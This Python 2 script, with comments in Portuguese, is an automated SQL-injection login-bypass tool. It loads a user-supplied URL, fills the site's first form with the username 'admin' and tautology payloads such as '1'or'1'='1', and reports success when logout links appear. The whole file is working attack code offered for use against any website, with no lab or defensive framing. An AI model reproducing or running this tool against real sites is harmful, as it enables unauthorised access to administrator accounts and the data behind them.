#!/usr/bin/env python
# -*- coding: UTF-8 -*-

"""
  Esse arquivo tenta
  usar a tautologia 
  em sites de internet

  Modificado em 21 de dezembro de 2016
  por Vitor Mazuco (vitor.mazuco@gmail.com)
"""

# Importação das bibliotecas necessárias
import mechanize
import re


br = mechanize.Browser()
br.set_handle_robots( False )
url = raw_input("Coloque a URL ")
br.set_handle_equiv(True)
br.set_handle_gzip(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.open(url)


for form in br.forms():
	print form
br.select_form(nr=0)
pass_exp = ['k','kl',"1'or'1'='1",'1" or "1"="1']  # Linha de Tautologia 

user1 = raw_input("Escreva o Username ")
pass1 = raw_input("Escreva o Password ")

flag =0
p =0
while flag ==0:
	br.select_form(nr=0)
	br.form[user1] = 'admin'
	br.form[pass1] = pass_exp[p]
	br.submit()
	data = ""
	for link in br.links():
		data=data+str(link)

	list = ['logout','logoff', 'signout','signoff', 'sair'] # Tenta achar essas palavras no site
	data1 = data.lower()
	
	for l in list:
		for match in re.findall(l,data1):
			flag = 1
	if flag ==1:
		print "\t Bem sucedido em ",p+1," tentativas"
		print "Tentativas bem-sucedidas! --> ",pass_exp[p]
		
	elif(p+1 == len(pass_exp)):
		print "Todas as exploits falharam "
		flag =1
	else :
		p = p+1

		

	
